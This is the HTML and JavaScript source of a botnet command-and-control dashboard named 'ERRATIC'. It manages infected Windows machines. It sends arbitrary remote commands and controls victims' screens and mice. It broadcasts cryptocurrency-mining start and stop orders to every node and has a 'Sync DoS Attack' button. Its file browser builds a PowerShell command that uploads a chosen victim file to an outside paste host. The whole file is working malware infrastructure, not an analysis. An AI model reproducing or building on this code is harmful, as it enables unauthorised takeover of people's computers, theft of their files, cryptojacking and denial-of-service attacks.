<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ERRATIC | C2 Control</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #000000;
            --sidebar: #0a0000;
            --panel: #120000;
            --accent: #ff0000; 
            --accent-muted: #4a0000;
            --text: #ffffff;
            --text-muted: #888888;
            --border: #220000;
        }

        * { box-sizing: border-box; }
        body, html { margin: 0; padding: 0; font-family: 'Inter', sans-serif; background-color: var(--bg); color: var(--text); height: 100vh; overflow: hidden; }

        .app-container { display: grid; grid-template-columns: 300px 1fr; height: 100vh; }

        /* Sidebar */
        .sidebar { background: var(--sidebar); border-right: 1px solid var(--border); display: flex; flex-direction: column; height: 100vh; }
        .sidebar-header { padding: 1.5rem; border-bottom: 1px solid var(--border); font-weight: 800; font-size: 1.5rem; color: var(--accent); letter-spacing: 2px; text-shadow: 0 0 10px var(--accent); }
        .global-control-panel { padding: 1rem; border-bottom: 1px solid var(--border); background: #050000; }
        .client-list { flex: 1; overflow-y: auto; padding: 1rem; scrollbar-width: thin; scrollbar-color: var(--accent) var(--bg); }
        .client-list h3 { font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); margin-bottom: 1rem; }

        .client-card { background: var(--panel); border: 1px solid var(--border); border-radius: 4px; padding: 12px; margin-bottom: 10px; cursor: pointer; transition: all 0.2s; }
        .client-card:hover { border-color: var(--accent); }
        .client-card.selected { border-color: var(--accent); box-shadow: inset 0 0 10px rgba(255,0,0,0.2); }
        .client-card.offline { opacity: 0.4; filter: grayscale(1); }

        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 8px; }
        .online .status-dot { background: var(--accent); box-shadow: 0 0 8px var(--accent); animation: pulse 1.5s infinite; }
        .offline .status-dot { background: #333; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

        /* Layout */
        .main-view { display: flex; flex-direction: column; overflow: hidden; }
        .top-nav { height: 60px; background: var(--sidebar); border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 2rem; }
        .stats-bar { display: flex; background: #050000; border-bottom: 1px solid var(--border); padding: 10px 2rem; gap: 3rem; }
        .stat-item { display: flex; flex-direction: column; }
        .stat-label { font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; }
        .stat-value { color: var(--accent); font-weight: bold; font-family: 'JetBrains Mono'; font-size: 1.1rem; }

        .tabs { display: flex; background: var(--sidebar); padding: 0 1rem; gap: 0.5rem; border-bottom: 1px solid var(--border); }
        .tab-btn { padding: 15px 20px; border: none; background: none; color: var(--text-muted); cursor: pointer; font-weight: 600; border-bottom: 2px solid transparent; }
        .tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }

        .content-area { flex: 1; padding: 1.5rem; overflow-y: auto; display: none; flex-direction: column; gap: 1.5rem; }
        .content-area.active { display: flex; }

        /* Terminal */
        .terminal-container { background: #000; border: 1px solid var(--border); display: flex; flex-direction: column; flex: 1; min-height: 400px; }
        #command-output { flex: 1; padding: 1.5rem; font-family: 'JetBrains Mono'; font-size: 0.85rem; overflow-y: auto; color: #ff3333; border-bottom: 1px solid var(--border); white-space: pre-wrap; }
        #command-input { background: none; border: none; color: white; font-family: 'JetBrains Mono'; padding: 15px; width: 100%; outline: none; }

        /* Explorer Restored */
        .file-browser { background: var(--panel); border: 1px solid var(--border); border-radius: 4px; overflow: hidden; }
        .file-header { padding: 1rem; background: var(--sidebar); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .file-item { display: flex; align-items: center; padding: 10px 15px; border-bottom: 1px solid var(--border); cursor: pointer; }
        .file-item:hover { background: rgba(255,0,0,0.1); }
        .file-icon { margin-right: 12px; font-size: 1.2rem; }
        .file-meta { flex: 1; }
        .file-name { font-size: 0.9rem; font-family: 'JetBrains Mono'; color: #fff; }

        .btn-primary { background: var(--accent); color: white; border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; }
        .btn-secondary { background: #111; border: 1px solid var(--border); color: #fff; padding: 5px 10px; cursor: pointer; font-size: 0.75rem; }
        .btn-danger { background: #440000; color: white; border: 1px solid red; padding: 8px 15px; cursor: pointer; }
        .meta-input { background: #000; border: 1px solid var(--border); color: white; padding: 8px; width: 100%; margin-top: 5px; }
        
        /* Remote Desktop Overlay */
        #control-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.98); z-index: 1000; display: none; flex-direction: column; align-items: center; justify-content: center; }
        #control-image { max-height: 90vh; border: 2px solid var(--accent); cursor: crosshair; background: #000; }

        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: var(--accent-muted); }
    </style>
</head>
<body>

<div id="control-overlay">
    <div style="margin-bottom: 10px; font-weight: bold; color: var(--accent); letter-spacing: 2px;">REMOTE SESSION ACTIVE | ESC TO EXIT</div>
    <img id="control-image" src="" alt="Live Stream">
</div>

<div class="app-container">
    <div class="sidebar">
        <div class="sidebar-header">ERRATIC</div>
        
        <div class="global-control-panel">
            <h3 style="font-size: 0.6rem; color: var(--accent); margin: 0 0 8px 0;">NETWORK BROADCAST</h3>
            <input type="text" id="global-miner-wallet" placeholder="Broadcast Wallet Address" class="meta-input" style="margin-bottom: 8px; font-size: 0.7rem;">
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
                <button class="btn-primary" onclick="broadcastMining('start')" style="font-size: 0.7rem;">Start All</button>
                <button class="btn-danger" onclick="broadcastMining('stop')" style="font-size: 0.7rem;">Kill All</button>
            </div>
            <button onclick="broadcastStress()" style="width: 100%; margin-top: 5px; background: #200; color: red; border: 1px solid red; font-size: 0.7rem; cursor: pointer; padding: 5px;">Sync DoS Attack</button>
        </div>

        <div class="client-list">
            <h3>Connected Nodes</h3>
            <div id="clients"></div>
        </div>
    </div>

    <div class="main-view">
        <div class="top-nav">
            <div id="node-title" style="font-weight: 700; color: var(--accent);">SELECT A NODE</div>
            <div id="conn-status-indicator" style="font-size: 0.7rem;"></div>
        </div>

        <div class="stats-bar">
            <div class="stat-item">
                <span class="stat-label">Network Hashrate</span>
                <span class="stat-value" id="net-hashrate">0.00 H/s</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Total Shares</span>
                <span class="stat-value" id="net-shares">0</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Active Workers</span>
                <span class="stat-value" id="net-workers">0</span>
            </div>
        </div>

        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('tab-terminal')">Console</button>
            <button class="tab-btn" onclick="switchTab('tab-files')">Files</button>
            <button class="tab-btn" onclick="switchTab('tab-tools')">Miner</button>
            <button class="tab-btn" onclick="switchTab('tab-identity')">Identity</button>
        </div>

        <!-- TABS -->
        <div id="tab-terminal" class="content-area active">
            <div style="display: flex; gap: 1rem; height: 100%;">
                <div style="flex: 2; display: flex; flex-direction: column;">
                    <div class="terminal-container">
                        <div id="command-output">Awaiting input...</div>
                        <input type="text" id="command-input" placeholder="Execute command..." onkeydown="if(event.key === 'Enter') sendCommand();">
                    </div>
                </div>
                <div style="flex: 1; display: flex; flex-direction: column; gap: 1rem;">
                    <div style="background: var(--panel); padding: 1rem; border: 1px solid var(--border);">
                        <h4 style="margin:0 0 10px 0; font-size: 0.7rem; color: var(--accent);">LIVE MONITOR</h4>
                        <img id="screenshot-image" style="width:100%; border: 1px solid var(--border); cursor: pointer; background:#000;" onclick="enterControlMode()">
                        <button class="btn-primary" style="width:100%; margin-top:10px" onclick="enterControlMode()">Remote Desktop</button>
                    </div>
                    <div style="background: var(--panel); padding: 1rem; border: 1px solid var(--border);">
                        <h4 style="margin:0 0 10px 0; font-size: 0.7rem; color: var(--accent);">NODE INTEL</h4>
                        <div style="font-family: 'JetBrains Mono'; font-size: 0.8rem; line-height: 1.8;">
                            Mining: <span id="node-stat-mining" style="color:var(--accent)">Null</span><br>
                            Rate: <span id="node-stat-rate" style="color:var(--accent)">0 H/s</span><br>
                            Shares: <span id="node-stat-shares" style="color:var(--accent)">0</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div id="tab-files" class="content-area">
            <div class="file-browser">
                <div class="file-header">
                    <div id="current-path-display" style="font-family: 'JetBrains Mono'; font-size: 0.8rem; color: var(--accent);">C:\</div>
                    <button class="btn-primary" onclick="refreshFiles()" style="font-size: 0.7rem;">Refresh</button>
                </div>
                <div id="file-list-container" style="max-height: 600px; overflow-y: auto;"></div>
            </div>
        </div>

        <div id="tab-tools" class="content-area">
             <div style="background: var(--panel); border: 1px solid var(--border); padding: 1rem;">
                <h4>Node Miner</h4>
                <input type="text" id="miner-wallet" placeholder="Wallet Address" class="meta-input">
                <div style="margin-top: 10px; display: flex; gap: 10px;">
                    <button class="btn-primary" onclick="runMiner('start')">Start</button>
                    <button class="btn-danger" onclick="runMiner('stop')">Stop</button>
                </div>
             </div>
        </div>

        <div id="tab-identity" class="content-area">
            <div style="background: var(--panel); border: 1px solid var(--border); padding: 1rem;">
                <h4>Node Alias</h4>
                <input type="text" id="edit-alias" class="meta-input">
                <h4 style="margin-top:20px">Description</h4>
                <textarea id="edit-desc" class="meta-input" rows="4"></textarea>
                <button class="btn-primary" style="margin-top: 15px;" onclick="saveMetadata()">Update Identity</button>
            </div>
        </div>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.4/socket.io.min.js"></script>
<script>
    {% raw %}
    const socket = io('/api');
    let current_client_id = null;
    let current_client_hostname = null;
    let allConnectedClients = [];
    let isControlMode = false;
    let commandHistory = {};
    let clientStates = {}; 

    const HASH_REGEX = /Hashrate:\s+([\d\.]+)\s+H\/s\s+\|\s+Shares:\s+(\d+)/;
    const STALE_MS = 10000; 
    const DIR_JSON_MARKER = '##DIR_JSON##';
    const MICROBIN_URL_BASE = 'https://microbin.elaptic.dev/';

    function switchTab(tabId) {
        document.querySelectorAll('.content-area').forEach(c => c.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.getElementById(tabId).classList.add('active');
        event.currentTarget.classList.add('active');
    }

    socket.on('connect', () => { socket.emit('join_dashboard'); });

    socket.on('client_list', (clients) => {
        allConnectedClients = clients;
        const list = document.getElementById('clients');
        list.innerHTML = '';
        clients.sort((a, b) => (a.online === b.online) ? 0 : a.online ? -1 : 1);

        clients.forEach(client => {
            const state = clientStates[client.hostname] || { hashrate: 0, lastSeen: 0 };
            const isMining = (Date.now() - state.lastSeen) < STALE_MS && state.hashrate > 0;
            const div = document.createElement('div');
            div.className = `client-card ${client.online ? 'online' : 'offline'} ${(current_client_hostname === client.hostname) ? 'selected' : ''}`;
            div.innerHTML = `
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <div><span class="status-dot"></span>${client.alias || client.hostname}</div>
                    ${isMining ? `<span style="font-size:0.6rem; color:red;">${Math.floor(state.hashrate)} H/s</span>` : ''}
                </div>
            `;
            if (client.online) div.onclick = () => selectClient(client);
            list.appendChild(div);
        });
        updateGlobalStats();
    });

    socket.on('command_output', (data) => {
        const targetClient = allConnectedClients.find(c => c.id === data.client_id);
        if (!targetClient) return;

        // 1. FILE SYSTEM HANDLER
        if (data.output.includes(DIR_JSON_MARKER)) {
            renderFileSystem(data.output.substring(data.output.indexOf(DIR_JSON_MARKER) + DIR_JSON_MARKER.length));
            return;
        }

        // 2. MINING REGEX
        const match = data.output.match(HASH_REGEX);
        if (match) {
            const rate = parseFloat(match[1]);
            const shares = parseInt(match[2]);
            if (!clientStates[targetClient.hostname]) clientStates[targetClient.hostname] = {};
            clientStates[targetClient.hostname].hashrate = rate;
            clientStates[targetClient.hostname].shares = shares;
            clientStates[targetClient.hostname].lastSeen = Date.now();
            updateGlobalStats();
            if (data.client_id === current_client_id) refreshMiningUI();
        }

        // 3. CONSOLE OUTPUT
        if (!commandHistory[targetClient.hostname]) commandHistory[targetClient.hostname] = "";
        commandHistory[targetClient.hostname] += data.output;
        if (data.client_id === current_client_id) {
            const outputDiv = document.getElementById('command-output');
            outputDiv.appendChild(document.createTextNode(data.output));
            outputDiv.scrollTop = outputDiv.scrollHeight;
        }
    });

    /* FILE EXPLORER (Original Restored) */
    function refreshFiles() {
        if (!current_client_id || !clientStates[current_client_hostname]) return;
        const path = clientStates[current_client_hostname].currentPath;
        const cmd = `powershell -Command "$p='${path.replace(/'/g, "''")}'; if(Test-Path $p){ $items = Get-ChildItem -Path $p | Select-Object Name, @{Name='IsDirectory';Expression={$_.PSIsContainer}}, @{Name='Size';Expression={$_.Length}}; echo '${DIR_JSON_MARKER}' (ConvertTo-Json -InputObject $items) } else { echo '${DIR_JSON_MARKER} []' }"`;
        socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
    }

    function renderFileSystem(jsonStr) {
        const container = document.getElementById('file-list-container');
        const pathDisplay = document.getElementById('current-path-display');
        let currentPath = clientStates[current_client_hostname].currentPath;
        pathDisplay.textContent = currentPath;
        container.innerHTML = '';

        const back = document.createElement('div');
        back.className = 'file-item';
        back.innerHTML = `<div class="file-icon">📁</div><div class="file-meta"><div class="file-name">.. (Parent Directory)</div></div>`;
        back.onclick = () => {
            const parts = currentPath.split('\\').filter(p => p.length > 0);
            if (parts.length > 1) { 
                parts.pop(); 
                clientStates[current_client_hostname].currentPath = parts.join('\\') + '\\'; 
                refreshFiles(); 
            }
        };
        container.appendChild(back);

        try {
            let items = JSON.parse(jsonStr.trim() || "[]");
            if (!Array.isArray(items)) items = items ? [items] : [];
            items.forEach(item => {
                const el = document.createElement('div');
                el.className = 'file-item';
                el.innerHTML = `
                    <div class="file-icon">${item.IsDirectory ? '📁' : '📄'}</div>
                    <div class="file-meta">
                        <div class="file-name">${item.Name}</div>
                        ${!item.IsDirectory ? `<div style="font-size:0.7rem; color:gray">${(item.Size / 1024).toFixed(1)} KB</div>` : ''}
                    </div>
                    ${!item.IsDirectory ? `<button class="btn-secondary" onclick="downloadFile('${item.Name.replace(/'/g, "\\'")}', event)">Get</button>` : ''}
                `;
                el.onclick = () => {
                    if (item.IsDirectory) {
                        clientStates[current_client_hostname].currentPath = currentPath.endsWith('\\') ? currentPath + item.Name + '\\' : currentPath + '\\' + item.Name + '\\';
                        refreshFiles();
                    }
                };
                container.appendChild(el);
            });
        } catch (e) { container.innerHTML = `<div style="padding:20px; color:red">Access Denied.</div>`; }
    }

    function downloadFile(name, event) {
        event.stopPropagation();
        const fullPath = (clientStates[current_client_hostname].currentPath + name).replace(/'/g, "''");
        const cleanBaseUrl = MICROBIN_URL_BASE.replace(/\/+$/, '');
        const uploadCmd = `powershell -Command "$filePath='${fullPath}'; $URL='${cleanBaseUrl}/upload'; $boundary = [System.Guid]::NewGuid().ToString(); $CRLF = [char]13 + [char]10; if(-not (Test-Path $filePath)){ echo 'File not found'; exit }; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $header = ('--' + $boundary + $CRLF + 'Content-Disposition: form-data; name=\\"file\\"; filename=\\"' + $fileName + '\\"' + $CRLF + 'Content-Type: application/octet-stream' + $CRLF + $CRLF); $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header); $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($CRLF + '--' + $boundary + '--' + $CRLF); $body = New-Object System.Collections.Generic.List[byte]; $body.AddRange($headerBytes); $body.AddRange($fileBytes); $body.AddRange($footerBytes); $response = Invoke-RestMethod -Uri $URL -Method Post -ContentType ('multipart/form-data; boundary=' + $boundary) -Body $body.ToArray(); if($response -match 'id=\\"download-link\\".*?href=\\"([^\\"]+)\\"') { $link = $Matches[1]; echo ('${cleanBaseUrl}' + $link) } else { echo 'Upload Finished - Link unavailable' }"`;
        socket.emit('command', { 'command': uploadCmd, 'client_id': current_client_id });
    }

    /* REMOTE DESKTOP (Coordinate Fix) */
    function enterControlMode() {
        if (!current_client_id) return;
        isControlMode = true;
        document.getElementById('control-overlay').style.display = 'flex';
        socket.emit('command', { 'command': '#scrsht 100', 'client_id': current_client_id });
    }

    document.getElementById('control-image').onclick = function(e) {
        if (!isControlMode || !current_client_id) return;
        const rect = this.getBoundingClientRect();
        const x = Math.floor(((e.clientX - rect.left) / rect.width) * 65535);
        const y = Math.floor(((e.clientY - rect.top) / rect.height) * 65535);
        const clickCmd = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $sig = '[DllImport(\\"user32.dll\\")] public static extern void mouse_event(uint f, uint x, uint y, uint d, uint e);'; $type = Add-Type -MemberDefinition $sig -Name \\"Win32Utils\\" -Namespace \\"Win32Utils\\" -PassThru; $type::mouse_event(0x8001, ${x}, ${y}, 0, 0); $type::mouse_event(0x0002, 0, 0, 0, 0); $type::mouse_event(0x0004, 0, 0, 0, 0);"`;
        socket.emit('command', { 'command': clickCmd, 'client_id': current_client_id });
    };

    window.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && isControlMode) {
            isControlMode = false;
            document.getElementById('control-overlay').style.display = 'none';
            socket.emit('command', { 'command': '#scrsht reset', 'client_id': current_client_id });
        }
    });

    socket.on('screenshot_data', (data) => {
        if (data.client_id === current_client_id) {
            const imgStr = "data:image/jpeg;base64," + data.image_data;
            document.getElementById('screenshot-image').src = imgStr;
            if (isControlMode) document.getElementById('control-image').src = imgStr;
        }
    });

    /* CORE HELPERS */
    function selectClient(client) {
        current_client_id = client.id;
        current_client_hostname = client.hostname;
        if (!clientStates[current_client_hostname]) clientStates[current_client_hostname] = { currentPath: "C:\\", hashrate: 0, lastSeen: 0, shares: 0 };
        document.getElementById('node-title').textContent = (client.alias || client.hostname).toUpperCase();
        document.getElementById('command-output').textContent = commandHistory[client.hostname] || "Terminal initialized...\n";
        if (client.screenshot_data) document.getElementById('screenshot-image').src = "data:image/jpeg;base64," + client.screenshot_data;
        refreshMiningUI();
    }

    function sendCommand() {
        const inp = document.getElementById('command-input');
        if (current_client_id && inp.value) { socket.emit('command', { command: inp.value, client_id: current_client_id }); inp.value = ''; }
    }

    function broadcastMining(action) {
        const wallet = document.getElementById('global-miner-wallet').value || "WORKER";
        allConnectedClients.forEach(c => { if(c.online) socket.emit('command', { command: `#miner ${action} 50 ${wallet}`, client_id: c.id }); });
    }

    function runMiner(action) {
        const wallet = document.getElementById('miner-wallet').value || "WORKER";
        socket.emit('command', { command: `#miner ${action} 50 ${wallet}`, client_id: current_client_id });
    }

    function updateGlobalStats() {
        let totalHash = 0, totalShares = 0, workers = 0;
        const now = Date.now();
        allConnectedClients.forEach(c => {
            const state = clientStates[c.hostname];
            if (state && (now - state.lastSeen) < STALE_MS) {
                totalHash += state.hashrate; totalShares += state.shares;
                if (state.hashrate > 0) workers++;
            }
        });
        document.getElementById('net-hashrate').textContent = totalHash.toLocaleString() + " H/s";
        document.getElementById('net-shares').textContent = totalShares;
        document.getElementById('net-workers').textContent = workers;
    }

    function refreshMiningUI() {
        const state = clientStates[current_client_hostname];
        const isMining = state && (Date.now() - state.lastSeen) < STALE_MS && state.hashrate > 0;
        document.getElementById('node-stat-mining').textContent = isMining ? "ACTIVE" : "Null";
        document.getElementById('node-stat-rate').textContent = isMining ? state.hashrate.toLocaleString() + " H/s" : "0 H/s";
        document.getElementById('node-stat-shares').textContent = state ? state.shares : "0";
    }

    function saveMetadata() { 
        socket.emit('update_metadata', { hostname: current_client_hostname, alias: document.getElementById('edit-alias').value, description: document.getElementById('edit-desc').value }); 
    }

    setInterval(() => { updateGlobalStats(); if (current_client_id) refreshMiningUI(); }, 2000);
    {% endraw %}
</script>
</body>
</html>
